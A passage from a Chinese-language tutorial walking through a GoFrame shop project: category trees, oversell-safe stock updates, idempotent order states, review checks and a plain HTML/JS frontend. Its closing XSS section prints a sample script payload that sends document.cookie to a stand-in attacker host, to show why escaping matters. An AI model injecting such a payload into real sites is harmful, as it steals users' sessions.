`var walk func(parentID uint)` 这种写法是 Go 的一个特殊语法——**先声明变量，再赋值函数体**。因为函数内部要调用自己（递归），如果直接用 `func walk(...)` 定义，Go 在编译函数体时还不知道 `walk` 是什么。先声明变量就没这个问题。

```go
	// ③ 兜底：孤儿数据也要显示
	if len(ordered) < len(list) {
		seen := make(map[uint]bool, len(ordered))
		for _, item := range ordered {
			seen[item.Id] = true
		}
		for _, item := range list {
			if !seen[item.Id] {
				ordered = append(ordered, item)
			}
		}
	}
	return ordered
```

第三段是防御性代码。假设有人手工去数据库删掉了"数码"这个分类，那么"充电器"的 `parent_id = 1` 指向一个不存在的记录——`walk(0)` 永远走不到它，它就从列表里消失了。

用户会看到"分类少了一个，但商品还在"，很难排查。所以最后补一段：把没被遍历到的（孤儿）追加到末尾。

### 3.2.2 两级限制：四道检查

数据库不限制级数，理论上可以挂成"数码 → 充电器 → 快充头 → 65W"无限层。但项目只支持两级，靠代码拦。

```go
// internal/logic/category/category.go 第 150 行

	...
	parentID := in.ParentID
	if parentID != 0 {
		// 检查 1：不能把自己挂到自己下面
		if in.ID != 0 && in.ID == parentID {
			return 0, gerror.NewCode(gcode.CodeInvalidParameter, "不能把分类挂到自己下面")
		}

		// 检查 2：父分类必须存在

		if err := dao.Category.Ctx(ctx).WherePri(parentID).Scan(&parent); err != nil {
			return 0, err
		}
		if parent == nil {
			return 0, gerror.NewCode(gcode.CodeNotFound, "父分类不存在")
		}

		// 检查 3：父分类必须是顶级（parent_id = 0）
		if parent.ParentId != 0 {
			return 0, gerror.NewCode(gcode.CodeInvalidParameter, "分类最多两级，不能挂在子分类下面")
		}

		// 检查 4：自己不能已经有子分类
		if in.ID != 0 {
			n, err := dao.Category.Ctx(ctx).Where(cols.ParentId, in.ID).Count()
			if err != nil {
				return 0, err
			}
			if n > 0 {
				return 0, gerror.NewCode(gcode.CodeInvalidParameter, "该分类下还有子分类，不能改成子分类")
			}
		}
	}
```

四条检查分别挡住四种搞乱结构的方式：

| 检查 | 挡住什么 |
|---|---|
| 1 | 数码的父分类设成数码（自己指自己，遍历时会死循环） |
| 2 | 父分类 ID 填了 999，实际不存在 |
| 3 | 想把"耳机"挂到"充电器"下面（变成第三级） |
| 4 | "数码"下面已有子分类，现在想把"数码"挂到"生活"下面（数码会带着两个孩子一起搬家，变成三级） |

第 1 条尤其重要：如果允许自己指向自己，`sortAsTree` 里的递归会无限循环，服务器内存被吃光然后崩溃。

### 3.2.3 删除保护

```go
// internal/logic/category/category.go 第 229 行
func (s *sCategory) AdminDelete(ctx context.Context, id uint64) error {
	// 有子分类 → 拒绝
	childCount, err := dao.Category.Ctx(ctx).Where(cols.ParentId, id).Count()
	if err != nil {
		return err
	}
	if childCount > 0 {
		return gerror.NewCodef(gcode.CodeInvalidParameter, "该分类下还有 %d 个子分类，请先删除子分类", childCount)
	}

	// 有商品 → 拒绝
	goodsCount, err := dao.Goods.Ctx(ctx).Where(dao.Goods.Columns().CategoryId, id).Count()
	if err != nil {
		return err
	}
	if goodsCount > 0 {
		return gerror.NewCodef(gcode.CodeInvalidParameter, "该分类下还有 %d 件商品，请先把商品移到其他分类", goodsCount)
	}

	_, err = dao.Category.Ctx(ctx).WherePri(id).Delete()
	return err
}
```

**为什么不直接删除？**

如果删掉"数码"，那 5 个商品的 `category_id` 仍然指向 1，但 1 已经不存在了。这些商品会从所有分类筛选里消失（按数码查不到，按别的分类也查不到），变成**孤儿数据**。用户在商城看不到，运营以为卖完了。

更好的设计是用**外键约束**（`FOREIGN KEY ... ON DELETE RESTRICT`）让数据库拒绝，但那样报错信息不友好。这里用代码先查再删，能给出清楚的提示："还有 5 件商品，请先移走"。

`gerror.NewCodef` 是"带格式化参数的错误码"，`%d` 会被 `childCount` 替换。

### 删除商品时清理购物车

```go
// internal/logic/goods/goods.go 第 149 行
```

这里有两个决定：

**2. 物理删除，不做软删除。** 一般而言电商系统商品都要软删除（加个 `deleted_at` 字段），因为订单要引用。但这里可以物理删除，理由是：**订单明细存的是快照**（第 1.3.5 节讲的那个设计）。

商品删了，历史订单里那行 `order_item` 仍然有 `goods_name`、`goods_price`，照样能显示。这就是快照设计带来的额外好处——解耦了商品和订单的生命周期。

不过后台评价列表里，如果商品被删了，`LEFT JOIN` 取到的 `g.name` 是 NULL，代码里兜底成"商品已删除"：

## 3.4 购物车：哪些东西能结算

`Add` 的逻辑第 2.3.4 节已经逐行讲过了。这里讲 `List`，因为它体现了另一种业务思维。

```go
// internal/logic/cart/cart.go 第 99 行
func (s *sCart) List(ctx context.Context, userID uint64) (*model.CartListOutput, error) {
	var rows []cartJoinRow
	err := dao.Cart.Ctx(ctx).As("c").
		LeftJoin("goods g", "g.id = c.goods_id").         // ← 联查商品表
		Fields("c.id AS cart_id, c.goods_id, c.quantity, "+
			"g.name, g.subtitle, g.cover, g.price, g.stock, g.status AS goods_status").
		Where("c.user_id", userID).
		OrderAsc("c.id").
		Scan(&rows)
```

**`LeftJoin` 是"左连接"**：以 `cart` 表为主，把 `goods` 表里对得上的字段拼过来。

为什么用 `LEFT JOIN` 而不是 `INNER JOIN`？因为商品可能已经被删了。`INNER JOIN` 会让"商品已删除"的购物车项**整行消失**——用户会发现"我购物车里有 3 件东西，怎么只显示 2 件了"，剩下那件凭空不见，也没法删掉它。`LEFT JOIN` 会保留这一行，只是商品字段为 NULL。

**`As("c")` 是起别名**，为了后面写 `c.user_id` 而不是 `cart.user_id`（字段名冲突时更清晰）。

```go
	// 下架、售罄、数量超库存都不能结算，但保留在列表里让用户自己处理
	switch {
	case row.GoodsStatus != consts.GoodsStatusOnSale:
		item.Available = false
		item.Reason = "商品已下架"
	case row.Stock == 0:
		item.Available = false
		item.Reason = "商品已售罄"
	case row.Quantity > row.Stock:
		item.Available = false
		item.Reason = "库存不足，请调整数量"
	}
```

**这是本节最值得学的设计：不删、不拦，只标记。**

购物车里的商品下架了，有三种处理方式：

| 方案 | 问题 |
|---|---|
| 直接删掉 | 用户莫名其妙少了东西 |
| 结算时报错 | 用户点到结算才知道，还得回头找是哪件 |
| **标灰 + 说明原因** | 用户一眼看到"哦，这个下架了"，自己决定删不删 |

第三种最好。`Available` 字段和 `Reason` 文案就是这个意思。

```go
	// 单价先转成分再乘数量，全程整数运算
	cents := money.ToCents(row.Price) * int64(row.Quantity)
	item.Subtotal = money.FromCents(cents)
	if item.Available {
		totalCents += cents
		out.TotalQuantity += row.Quantity
	} else {
		out.InvalidCount++
	}
```

**总金额只算可结算的商品。**

用户购物车里有 3 件：2 件正常（199 + 99）、1 件下架（50）。底部显示"合计 ¥298"，而不是 ¥348。因为那 50 元的东西他买不了，算进去会让他以为要付 348。

同时 `InvalidCount = 1`，界面上显示"共 2 件 · 1 件不可结算"，把差额解释清楚。

价格计算还是那个原则：**转成分再乘**。`199.00 * 3` 用 float 算也可能出误差，用 `19900 * 3 = 59700` 分绝无问题。

### 3.5.1 下单：一个事务里的四件事

这是全项目最复杂的函数，值得逐段读。


**注意 `service.Cart().List(ctx, ...)` 传的是事务里的 `ctx`。** 这一点很关键——如果传了外面的 ctx，购物车查询就不在事务内，可能出现"读到的购物车和删掉的不是同一批"。

```go

			totalCents int64
			totalQty   uint
			cartIDs    = make([]uint64, 0, len(cartOut.List))
			itemRows   = make([]g.Map, 0, len(cartOut.List))
		)

		for _, item := range cartOut.List {
			// 下架、售罄的条目直接跳过，不阻断其他商品的结算
			if !item.Available {
				continue
			}
```

**跳过不可结算的，而不是报错。** 用户购物车里有 3 件，其中 1 件下架了。如果直接报错"有商品不可结算"，用户点了半天结算却失败，还得回去找是哪件。跳过它，剩下的 2 件正常下单，购物车页面已经标灰说明了原因。

```go
			// 条件更新：只有库存足够时才扣减，并发下不会超卖
			res, err := dao.Goods.Ctx(ctx).
				Where(goodsCols.Id, item.GoodsID).
				Where(goodsCols.Status, consts.GoodsStatusOnSale).
				Where("stock >= ?", item.Quantity).     // ← 关键！
				Decrement(goodsCols.Stock, item.Quantity)
			if err != nil {
				return err
			}
			affected, err := res.RowsAffected()
			if err != nil {
				return err
			}
			if affected == 0 {
				return gerror.Newf("「%s」库存不足，请返回购物车调整数量", item.Name)
			}
```

**这是防超卖的核心，值得反复看。**

`Decrement(col, n)` 生成的是 `UPDATE goods SET stock = stock - n WHERE ...`。

如果写成先查再改：

```go
// 错误写法
if goods.Stock >= qty {           // 查：库存 10，要买 1
    // ← 这里如果另一个用户也查了，也看到 10
    dao.Goods.Update("stock", goods.Stock - qty)   // 改：设成 9
}
```

两个用户同时下单，都读到"库存 10"，都设成 9。卖了 2 件，库存只减了 1 件。库存 1 件的时候能卖出去 100 件。

正确做法是**把判断和修改合成一条 SQL**：

```sql
UPDATE goods SET stock = stock - 1 WHERE id = 5 AND status = 1 AND stock >= 1
```

数据库执行 UPDATE 时会加行锁，同一行的 UPDATE 是串行的。第一个执行完 `stock` 变成 0，第二个的 `WHERE stock >= 1` 就不成立了，影响 0 行。

`affected == 0` 就说明"没扣成功"，原因可能是：商品被下架了、库存不够了、商品被删了。统一报"库存不足"，让用户回购物车看看。

**这种做法叫"乐观并发控制"**：不加锁，靠条件更新保证正确性。性能比悲观锁（`SELECT ... FOR UPDATE`）好很多。

```go
			cents := money.ToCents(item.Price) * int64(item.Quantity)
			totalCents += cents
			totalQty += item.Quantity
			cartIDs = append(cartIDs, item.ID)

			// 商品名、价格、封面存快照
```


写订单主表。`InsertAndGetId` 是"插入并返回自增 ID"，比 `Insert` 后再查一次快。

订单号生成：

场景：用户在两个标签页里都打开了购物车，都点了"提交订单"。两个请求几乎同时到达：

```
请求 B：读到购物车 [1,2,3]（A 还没删完），扣库存，建订单 #101，删购物车 1,2,3 → 删除 0 行
```

如果不检查，B 也会成功，用户被扣两次钱、下两个单。

检查到"只删了 0 行，但预期 3 行"时，说明购物车被别人动过了，`return err` 触发**整个事务回滚**——订单 #101 被撤销，B 扣的库存还回去。

**为什么用删除的行数而不是先查一遍？** 因为删除本身带锁，`affected` 是数据库给出的"确实删掉了这么多"，比"查到的数量"更可靠。

### 3.5.2 状态流转：靠 WHERE 条件实现幂等

订单状态变化有三种：付款（0→1）、发货（1→2）、完成（2→3）。后台发货和完成共用一个函数：

```go
// internal/logic/order/order.go 第 519 行
func (s *sOrder) moveStatus(ctx context.Context, orderID uint64, from, to uint, errMsg string) error {
	cols := dao.Orders.Columns()
	res, err := dao.Orders.Ctx(ctx).
		WherePri(orderID).
		Where(cols.Status, from).          // ← 只有当前状态等于 from 才更新
		Data(g.Map{cols.Status: to}).
		Update()
	if err != nil {
		return err
	}
	affected, err := res.RowsAffected()
	if err != nil {
		return err
	}
	if affected == 0 {
		return gerror.NewCode(gcode.CodeNotFound, errMsg)
	}
	return nil
}
```

调用：

```go
func (s *sOrder) AdminShip(ctx context.Context, orderID uint64) error {
	return s.moveStatus(ctx, orderID, consts.OrderStatusPaid, consts.OrderStatusShipped, "订单不存在或当前状态不可发货")
}

func (s *sOrder) AdminFinish(ctx context.Context, orderID uint64) error {
	return s.moveStatus(ctx, orderID, consts.OrderStatusShipped, consts.OrderStatusFinished, "订单不存在或当前状态不可完成")
}
```

生成的实际 SQL：

```sql
UPDATE orders SET status = 2 WHERE id = 100 AND status = 1
```

**这一个 `AND status = 1` 解决了三个问题：**

| 问题 | 为什么被解决 |
|---|---|
| 已经发货的订单又点了一次"发货" | `status` 已经是 2，不匹配 1，影响 0 行，返回错误 |
| 未付款的订单想直接发货 | `status` 是 0，不匹配 1，拒绝 |
| 两个管理员同时点发货 | 第一个改成功后 status 变 2，第二个的条件不成立 |

**这叫幂等性**（同一操作执行多次，效果和执行一次相同）。不是靠"先查状态再判断"实现的——那种做法在并发下会失效（两个请求都查到 status=1，都认为自己可以改）。

### 3.5.3 取消订单：回滚库存

```go

			Where(orderCols.Id, orderID).
			Where(orderCols.UserId, userID).        // ← 只能取消自己的
			Where(orderCols.Status, consts.OrderStatusPending).
			Data(g.Map{orderCols.Status: consts.OrderStatusCancelled}).
			Update()
		...
		if affected == 0 {
			return gerror.NewCode(gcode.CodeNotFound, "订单不存在或当前状态不可取消")
		}

		// ② 把库存加回去
		var items []entity.OrderItem
		if err = dao.OrderItem.Ctx(ctx).Where(itemCols.OrderId, orderID).Scan(&items); err != nil {
			return err
		}
		for _, it := range items {
			if _, err = dao.Goods.Ctx(ctx).
				Where(goodsCols.Id, it.GoodsId).
				Increment(goodsCols.Stock, it.Quantity); err != nil {   // ← 加回去
				return err
			}
		}
		return nil
	})
}
```

两个要点：

**① 必须带 `user_id` 条件。** 否则用户 A 可以取消用户 B 的订单（只要猜对订单 ID）。这就是所谓**水平越权**，是 Web 安全里最常见的漏洞之一。

**② 库存要还回去。** 下单时扣了库存，取消时不还，库存就永久少了一块。用户下单-取消三次，商品就"凭空少了 3 件库存"，最后显示"售罄"但实际仓库有货。

注意这里是 `Increment`（加），且没有 `WHERE stock >= n` 的条件——加库存不需要检查上限。

### 3.5.4 支付：加销量

```go
// internal/logic/order/order.go 第 310 行
func (s *sOrder) Pay(ctx context.Context, userID, orderID uint64) (*gtime.Time, error) {
	paidAt := gtime.Now()      // ← 在事务外先取时间

	err := g.DB().Transaction(ctx, func(ctx context.Context, tx gdb.TX) error {
		res, err := dao.Orders.Ctx(ctx).
			Where(orderCols.Id, orderID).
			Where(orderCols.UserId, userID).
			Where(orderCols.Status, consts.OrderStatusPending).
			Data(g.Map{
				orderCols.Status: consts.OrderStatusPaid,
				orderCols.PaidAt: paidAt,
			}).
			Update()
		...
		// 销量累加
		for _, it := range items {
			dao.Goods.Ctx(ctx).Where(goodsCols.Id, it.GoodsId).Increment(goodsCols.Sales, it.Quantity)
		}
		return nil
	})
	...
	return paidAt, nil
}
```

**为什么销量在"付款"时加，而不是"下单"时加？**

因为下单不代表买到了。用户可以下单后不付款、或者取消。如果下单就加销量，会出现"销量 100，实际成交 3 单"的虚高数字，误导其他买家。

也有在"完成"时才加销量的做法（更严格，排除退货），但付款时加已经能过滤掉绝大多数虚假数据。

**这是"模拟支付"。** 真实项目这里要接微信支付/支付宝，流程是：

1. 前端调后端"创建支付单"，后端调微信统一下单接口，拿到支付参数
2. 用户跳转到微信完成支付
3. 微信**异步回调**后端的一个 URL，后端验证签名后改订单状态

第 3 步必须在服务端做，不能靠前端"支付成功后调接口"——前端可以被伪造。

## 3.6 评价：校验顺序很重要

### 3.6.1 发表评价的四道关

```go
// internal/logic/review/review.go 第 35 行
func (s *sReview) Create(ctx context.Context, userID uint64, in model.ReviewCreateInput) (uint64, error) {
	// ① 订单明细存在吗
	var item *entity.OrderItem
	if err := dao.OrderItem.Ctx(ctx).WherePri(in.OrderItemID).Scan(&item); err != nil {
		return 0, err
	}
	if item == nil {
		return 0, gerror.NewCode(gcode.CodeNotFound, "订单明细不存在")
	}

	// ② 这笔明细是我买的吗
	var order *entity.Orders
	if err := dao.Orders.Ctx(ctx).WherePri(item.OrderId).Scan(&order); err != nil {
		return 0, err
	}
	// 不是自己的订单统一按「不存在」处理，不透露别人的订单有没有这个商品
	if order == nil || order.UserId != userID {
		return 0, gerror.NewCode(gcode.CodeNotFound, "订单明细不存在")   // ← 同一个提示
	}

	// ③ 订单完成了吗
	if order.Status != consts.OrderStatusFinished {
		return 0, gerror.NewCode(gcode.CodeInvalidParameter, "订单完成后才能评价")
	}

	// ④ 评过了吗
	exists, err := dao.GoodsReview.Ctx(ctx).Where(cols.OrderItemId, in.OrderItemID).Count()
	if err != nil {
		return 0, err
	}
	if exists > 0 {
		return 0, gerror.NewCode(gcode.CodeInvalidParameter, "该商品已经评价过了")
	}
	...
}
```

**为什么不直接传 `goodsId`，而要用"订单明细 ID"？**

三个原因：

1. **少一个可伪造的参数**。传 `goodsId` 的话，用户随便填个 ID 就能给没买过的商品刷好评。传 `orderItemId`，后端自己从明细里读出 `goodsId`、`orderId`、`userId`，用户伪造不了。
2. **天然支持"同一商品多次评价"**。买了两次同一个商品，是两条明细，可以各评一次。
3. **"买了才能评"是免费的**。明细只存在于真实订单里，有明细就说明买过。

**第 ② 步的错误提示和第 ① 步一样**，都是"订单明细不存在"。这是故意的：如果提示"这不是你的订单"，等于告诉攻击者"这个明细 ID 是存在的，只是不属于你"，他就能遍历 ID 探测有多少订单。

**第 ③ 步"订单完成后才能评价"** 是为了防刷。如果付款就能评，商家可以自己下单付款、立刻打五星、然后取消——一天能刷几十条。

```go
	id, err := dao.GoodsReview.Ctx(ctx).Data(g.Map{...}).InsertAndGetId()
	if err != nil {
		// 并发下两个请求可能同时通过上面的 Count，唯一键兜底，转成同样的提示
		if strings.Contains(err.Error(), "Duplicate entry") {
			return 0, gerror.NewCode(gcode.CodeInvalidParameter, "该商品已经评价过了")
		}
		return 0, err
	}
```

**这一步是兜底。** 第 ④ 步的 `Count()` 检查在并发下会失效（两个请求同时查到 0 条），真正挡住第二次插入的是 `uk_order_item` 唯一键。捕获这个错误并转成友好提示，用户就不会看到"Duplicate entry"。

`strings.Contains(err.Error(), "Duplicate entry")` 这种靠字符串匹配判断错误类型的方式不太优雅，但 MySQL 驱动没有提供更结构化的错误码（其实有 `mysql.MySQLError` 的 `Number == 1062`，用那个更稳）。

### 3.6.2 匿名：前台和后台的处理完全相反

同一个 `anonymous` 字段，两个地方读出了相反的结果。

**前台（商品详情页）**：

```go

anonymous := r.Anonymous == 1
if anonymous {
	nickname = anonymousName          // "匿名用户"
} else if nickname == "" {
	nickname = "已注销用户"           // 用户被删了
}

	ID:        r.Id,
	Nickname:  nickname,
	Rating:    r.Rating,
	Content:   r.Content,
	Anonymous: anonymous,
	CreatedAt: r.CreatedAt,
	// 注意：没有 UserId 字段

```

前台的 `ReviewItem` 结构体里**根本没有 `UserId` 这个字段**，所以即使前端想看也拿不到。加上昵称被替换成"匿名用户"，匿名就是真匿名。

**后台（评价管理）**：

```go
// internal/logic/review/review.go 第 249 行
out = append(out, model.ReviewAdminItem{
	ID:        r.Id,
	GoodsID:   r.GoodsId,
	GoodsName: name,
	UserID:    r.UserId,        // ← 有 UserId
	Username:  r.Username,      // ← 有用户名
	Nickname:  r.Nickname,      // ← 真实昵称，没替换
```

后台拿到真实的昵称和用户名，`anonymous` 只是一个 tag 供界面显示"匿名"小标签。

**为什么要区别对待？**

因为匿名的承诺是"**对其他买家匿名**"，不是"对平台匿名"。

如果对平台也匿名，那有人发"加微信 xxx 卖假货"，运营就完全查不到是谁发的。电商平台的匿名评价，后台一定看得到真实用户——这是行业惯例，也是监管要求。

### 3.6.3 评分汇总：一次 GROUP BY

```go
// internal/logic/review/review.go 第 147 行
func (s *sReview) Summary(ctx context.Context, goodsID uint64) (*model.ReviewSummary, error) {
	cols := dao.GoodsReview.Columns()

	var rows []struct {
		Rating uint `orm:"rating"`
		Total  int  `orm:"total"`
	}
	if err := dao.GoodsReview.Ctx(ctx).
		Fields(cols.Rating, "COUNT(*) AS total").
		Where(cols.GoodsId, goodsID).
		Where(cols.Status, 1).
		Group(cols.Rating).          // ← 按星级分组
		Scan(&rows); err != nil {
		return nil, err
	}
```

`GROUP BY rating` 生成的是这样的结果：

| rating | total |
|---|---|
| 3 | 1 |
| 4 | 1 |
| 5 | 6 |

最多 5 行，不管有多少条评价。如果不用 `GROUP BY` 而是查出所有评价再在 Go 里数，一万条评价就要传一万行数据。

**注意那个匿名结构体**：

```go
var rows []struct {
	Rating uint `orm:"rating"`
	Total  int  `orm:"total"`
}
```

这里不能写 `var rows []uint` 或 `var counts []int`。这是一个真实的坑——第 6 章详细讲。

```go
	var (
		sum   int
		count int
		out   = &model.ReviewSummary{}
	)
	for _, r := range rows {
		if r.Rating < 1 || r.Rating > 5 {
			continue                    // 脏数据保护
		}
		out.Counts[r.Rating-1] = r.Total    // 数组下标从 0 开始，所以减 1
		sum += int(r.Rating) * r.Total
		count += r.Total
	}
	out.Count = count
	if count > 0 {
		out.AvgRating = math.Round(float64(sum)/float64(count)*10) / 10    // 保留一位小数
	}
	return out, nil
}
```

**平均分的算法**：`(5×6 + 4×1 + 3×1) / 8 = 37/8 = 4.625`，四舍五入到一位小数 = 4.6。

用加权求和而不是把每条评价的分数加起来平均——两者数学上一样，但前者在 `GROUP BY` 的结果上直接算，不需要原始数据。

`math.Round(x*10)/10` 是"保留一位小数"的经典写法：乘 10 让小数点右移一位，四舍五入，再除回去。

`out.Counts` 是 `[5]int` 固定长度数组，`Counts[0]` 对应 1 星，`Counts[4]` 对应 5 星。用固定数组而不是 map，是因为星级本来就固定 5 种，数组更快也更明确。

**注意 `if count > 0` 的判断**：没有评价时不能做除法，否则是除零错误（Go 里除零会 panic）。

# 第 4 章 前端：两个 HTML 文件怎么跑起来

## 4.1 网页只有三样东西

打开 `resource/public/index.html`，从上到下是三个部分：

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>GoFrame 商城</title>
  <style>
    /* ① CSS：长什么样 */
  </style>
</head>
<body>
  <!-- ② HTML：有什么东西 -->
  <header>...</header>
  <main>...</main>

  <script>
    // ③ JavaScript：能做什么
  </script>
</body>
</html>
```

| 部分 | 作用 | 类比 |
|---|---|---|
| HTML | 页面上有哪些元素（标题、按钮、输入框） | 房子的墙和门 |
| CSS | 这些元素长什么样（颜色、大小、位置） | 装修 |
| JavaScript（JS） | 用户点按钮之后发生什么 | 水电和开关 |

**这个项目没有用 React、Vue 这类前端框架**，全部是原生的。原因很简单：只有两个页面，引框架要装 Node、要打包、要编译，改一个按钮颜色都得重启构建。原生写法保存文件、刷新浏览器就能看到效果。

代价是代码写起来比较"笨"，第 4.6 节会讲。

## 4.2 HTML：页面骨架

```html
<!-- resource/public/index.html 第 347 行 -->
<body>

<header>
  <h1>GoFrame <span>商城</span></h1>
  <input id="search" type="search" placeholder="搜索商品名称…">
  <div class="head-right">
    <div id="userArea"></div>                                    <!-- 登录状态区，内容由 JS 填 -->
    <button class="cart-btn" onclick="openOrders()">📦 我的订单</button>
    <button class="cart-btn" onclick="openCart()">
      🛒 购物车<em id="cartBadge" class="badge hide">0</em>       <!-- 数量角标 -->
    </button>
  </div>
</header>

<nav id="cats"></nav>                                            <!-- 分类导航，内容由 JS 填 -->

<main>
  <div class="meta" id="meta">加载中…</div>
  <div class="grid" id="goods"></div>                             <!-- 商品网格，内容由 JS 填 -->
</main>
```

三个要点：

**1. `id` 是元素的身份证。** JS 靠 `document.getElementById('goods')` 找到它。一个页面里 id 不能重复。

**2. `class` 是样式名。** CSS 里 `.grid { ... }` 对应的就是 `class="grid"` 的元素。一个元素可以有多个 class（`class="cart-btn sm"`），一个 class 可以被多个元素用。

**3. `onclick="openCart()"` 是内联事件绑定。** 点这个按钮就执行 `openCart()` 这个 JS 函数。这是最老但最直观的写法，适合小项目。

**注意很多容器是空的**：

```html
<div class="grid" id="goods"></div>
```

里面什么都没有。因为商品是动态的，页面打开时不知道有几件。JS 拿到数据后才把内容塞进去。

## 4.3 CSS：三个最常用的规则

```css
/* resource/public/index.html 第 6 行 */
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  font-family: -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif;
  background: #f5f6f8;
  color: #1a1a1a;
  line-height: 1.6;
}
```

**第一行 `* { margin: 0; padding: 0 }` 是"清零"。**
浏览器给每个元素都加了默认的外边距（比如 `<h1>` 上下有大空隙），不同浏览器还不一样。先全部清掉，再自己设定，页面在各浏览器里才能长得一样。这是所有项目的标配。

**`font-family` 那串是"字体降级链"。**
先用苹果系统的字体，没有就用 Windows 的 Segoe UI，再没有就用微软雅黑，最后用系统默认的无衬线字体。保证在什么设备上都不会显示成难看的宋体。

商品网格用的是 **CSS Grid**：

```css
.grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
  gap: 16px;
}
```

翻译成人话：

- `display: grid` 启用网格布局
- `repeat(auto-fill, minmax(220px, 1fr))`：每列最少 220px 宽，能塞几列塞几列，剩余空间平分（`1fr`）
- `gap: 16px`：格子之间留 16px 空隙

效果：屏幕宽就显示 4 列，窄就 2 列，手机上 1 列，**不用写任何媒体查询**。

这是 Grid 比老式 float/flex 布局强的地方。

## 4.4 JavaScript 只做三件事

整个前端的 JS，无论多复杂，本质上只做三件事：

1. **发请求**：问后端要数据，或者告诉后端做事
2. **改页面**：拿到数据后，把 HTML 重新拼一遍
3. **绑事件**：用户点了什么，执行对应函数

### 4.4.1 发请求：api() 封装

原生 `fetch` 用起来啰嗦，所以项目里包了一层：

```js
// resource/public/index.html 第 539 行
async function api(path, opts) {
  // ① 默认带上 Cookie
  const init = Object.assign({ credentials: 'same-origin' }, opts || {});

  // ② body 是对象就自动转 JSON
  if (init.body && typeof init.body !== 'string') {
    init.headers = Object.assign({ 'Content-Type': 'application/json' }, init.headers || {});
    init.body = JSON.stringify(init.body);
  }

  // ③ 发请求
  const res = await fetch(API + path, init);
  const json = await res.json();

  // ④ 统一错误处理
  if (json.code !== 0) {
    const err = new Error(json.message || '请求失败');
    err.code = json.code;
    throw err;
  }
  return json.data;
}
```

逐段解释：

**`credentials: 'same-origin'`** —— 这一句是整个登录功能的基础。

浏览器的安全策略默认**不发送跨域 Cookie**。`same-origin` 的意思是"同源请求要带 Cookie"。不加这一句，登录接口返回成功、Session 也写了，但后续所有请求都不带 Cookie，服务器认不出你是谁——表现就是"登录成功，但一刷新又变成未登录"。

**`async` / `await`** —— 这两个词让异步代码看起来像同步的。

```js
const res = await fetch(...)     // 等请求回来再继续
const json = await res.json()    // 等 JSON 解析完再继续
```

如果不加 `await`，代码会立刻往下跑，此时 `res` 还是未完成的承诺（Promise），拿到的东西全是 undefined。

**`json.code !== 0`** —— 这里对应后端第 2.5 节的错误码体系。后端无论成功失败都返回 HTTP 200，靠 `code` 区分。所以前端不用判断 HTTP 状态码，只看 `code`。

**`throw err`** —— 抛出异常后，调用处可以用 `try/catch` 统一处理：

```js
try {
  await api('/cart/add', { method: 'POST', body: { goodsId: 5, quantity: 1 } });
} catch (e) {
  toast(e.message);      // 把后端返回的中文提示显示出来
}
```

`err.code = json.code` 这一行让调用处能拿到错误码（比如 61 = 未登录），做针对性处理。


拆开看：

**反引号 `` ` `` 是"模板字符串"**，可以在里面用 `${}` 插入变量，还能直接换行。如果普通字符串，得写成 `'<div class="card" onclick="openDetail(' + g.id + ')">'`，又长又容易引号错乱。

**`data.list.map(g => ...)` 是"把数组里每个元素变成一个 HTML 片段"。**
10 件商品就变成 10 个字符串。

**`.join('')` 是"把这 10 个字符串拼成一个"。**
因为 `innerHTML` 只接受一个字符串，不接受数组。

**`grid.innerHTML = ...` 是把拼好的 HTML 塞进容器。**

这一步会把容器原来的内容全部替换掉。所以每次刷新列表都是"整个重画"，不是"改其中一行"。对小页面完全够用，数据量大时才需要考虑虚拟滚动之类的优化。

几个细节：

```js
onclick="openDetail(${g.id})"
```

`${g.id}` 会被替换成数字，比如 `onclick="openDetail(5)"`。注意**这里没有引号**——如果商品 id 是字符串类型，就得写成 `onclick="openDetail('${g.id}')"`。数字类型不需要。

```js
onerror="this.style.visibility='hidden'"
```

图片加载失败时把图藏起来。为什么用 `visibility: hidden` 而不是 `display: none`？因为前者保留占位空间，布局不会塌；后者会让整个卡片缩下去，列表看起来乱七八糟。商品图挂了的情况比想象中常见（外链失效、CDN 出问题）。

```js
${g.subtitle || ''}
```

`||` 是"如果左边是假值（空字符串、null、undefined、0），就用右边"。防止页面上出现 `undefined` 这种字样。

### 4.4.3 绑事件：两种方式

**方式一：内联（HTML 里写 onclick）**

```html
<button class="btn" onclick="checkout()">去结算</button>
```

**方式二：JS 里赋值**

```js
// resource/public/admin.html 第 1464 行
document.querySelectorAll('.tabs button').forEach((b) => {
  b.onclick = () => switchTab(b.dataset.tab);
});
```

方式一适合"HTML 是静态写死的"场景（按钮只有一个，功能固定）。
方式二适合"元素是动态生成的"或"要批量绑定"场景（后台 5 个 tab 按钮，统一样式）。

`b.dataset.tab` 读的是 HTML 里的 `data-tab="goods"` 属性。`data-*` 是 HTML 的自定义属性约定，专门用来存"给 JS 读的小数据"，浏览器不会显示它。

## 4.5 状态存在哪：全局变量

前端没有数据库，但也要记住一些东西。这个项目全存在**全局变量**里：

```js

let catList = [];              // 分类列表

let authMode = 'login';        // 登录弹窗当前是"登录"还是"注册"
let pendingAdd = null;         // 未登录时点加购，先记下来，登录后自动补上
```

`let` 和 `const` 的区别：`let` 可以被重新赋值，`const` 不行。`catList` 虽然内容会变（`catList = [...]`），但每次都是整体替换，所以其实可以互相换用。

**`me` 是最重要的状态**。它决定了：

- 顶栏显示"登录/注册"按钮还是"👤 昵称"
- 点加购时是直接加还是弹登录框
- 后台页面是否放行

```js
// resource/public/index.html 第 870 行

  if (me) {

```

注意 `${me.role === 1 ? '...' : ''}` —— 只有管理员才显示"管理后台"链接。

但**这只是隐藏了入口，不是权限控制**。普通用户完全可以手动在地址栏输入 `/admin.html`。真正的拦截在后端（`Admin` 中间件），前端隐藏只是"不给用户看没用的东西"。

这个区分很重要：**前端的任何校验都可以被绕过，只有后端的校验算数。**

**`pendingAdd` 解决一个体验问题**：

```js

    openLogin('login');

```

用户逛到一半想加购，没登录 → 弹登录框，同时把"要加什么"记下来。登录成功后再自动执行：

```js

```

如果不做这个，用户得"登录 → 重新找到那个商品 → 再点一次加购"，很烦。

## 4.6 XSS：为什么必须转义

这是前端唯一一个"写错了会出安全事故"的地方。

**问题**：评价内容是用户自己填的。如果用户填：

```
<script>fetch('http://坏人.com/steal?cookie='+document.cookie)</script>
```

而前端直接把它拼进 `innerHTML`，浏览器会**把它当代码执行**——所有看过这条评价的人，Cookie 都被发到坏人的服务器。有了 Cookie 就能冒充登录。

这种攻击叫 **XSS（跨站脚本）**。

